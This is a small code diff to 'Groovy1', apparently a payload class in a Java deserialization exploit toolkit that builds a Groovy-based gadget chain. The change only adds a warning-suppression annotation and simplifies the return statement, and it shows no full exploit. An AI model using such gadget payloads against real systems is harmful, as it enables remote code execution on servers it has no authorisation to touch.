@@ -11,6 +11,7 @@ import java.util.Map;
 
 import static com.qi4l.JYso.gadgets.utils.Utils.createProxy;
 
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 @Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
 @Authors({Authors.FROHOFF})
 public class Groovy1 implements ObjectPayload<InvocationHandler> {
@@ -20,8 +21,6 @@ public class Groovy1 implements ObjectPayload<InvocationHandler> {
 
         final Map map = createProxy(closure, Map.class);
 
-        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
-
-        return handler;
+        return Gadgets.createMemoizedInvocationHandler(map);
     }
 }
